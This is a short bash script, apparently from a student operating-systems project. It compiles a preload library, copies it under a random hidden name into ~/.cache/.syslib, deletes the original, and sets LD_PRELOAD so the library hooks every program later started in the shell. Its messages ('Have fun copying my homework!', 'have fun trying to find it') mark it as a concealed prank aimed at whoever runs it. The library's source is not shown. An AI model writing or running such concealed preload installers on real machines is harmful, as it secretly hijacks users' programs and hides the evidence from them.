#!/bin/bash

# Make sure this script is sourced on the terminal 

# Compile preloadLib.c into preloadLib.so
echo "[*] Starting installation..."
sleep 1
echo "Have fun copying my homework!"
sleep 1

gcc -shared -fPIC -o preloadLib.so preloadLib.c -ldl

if [ $? -ne 0 ]; then
    echo "Compilation failed"
    return 1
fi

# Define hidden location
HIDDEN_DIR="$HOME/.cache/.syslib"
SOURCE_SO="$HOME/Documents/OS_Project/osProject/main/src/test/preloadLib.so"
NEW_NAME=".lib$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).so"
HIDDEN_SO="$HIDDEN_DIR/$NEW_NAME"

# Create the hidden directory if it doesn't exist
mkdir -p "$HIDDEN_DIR"

# Move and rename the .so file
cp "$SOURCE_SO" "$HIDDEN_SO"
chmod 755 "$HIDDEN_SO"
rm -f "$SOURCE_SO"

# Export LD_PRELOAD in current shell session
export LD_PRELOAD="$HIDDEN_SO"
alias geary='DISABLE_WRITE_PRANK=1 geary'

echo "[✓] Install complete."
echo "[*] Install complete."
echo "[!] Original .so deleted, have fun trying to find it ;)"
#echo "Your .so file is now hidden at: $HIDDEN_SO"
